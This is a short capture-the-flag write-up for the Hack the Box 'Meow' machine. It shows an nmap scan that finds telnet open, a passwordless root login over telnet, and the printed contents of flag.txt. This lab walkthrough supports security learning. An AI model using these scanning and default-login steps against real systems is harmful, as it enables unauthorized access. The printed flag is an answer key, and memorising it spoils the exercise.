Hack the Box
Starting Pont
Meow

10.129.125.166

sudo nmap -sV -sC -oA nmap/meow 10.129.125.166

Starting Nmap 7.93SVN ( https://nmap.org ) at 2023-06-17 17:19 EDT
Nmap scan report for 10.129.125.166
Host is up (0.12s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.88 seconds


$ telnet 10.129.125.166
Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
root@Meow:~# 
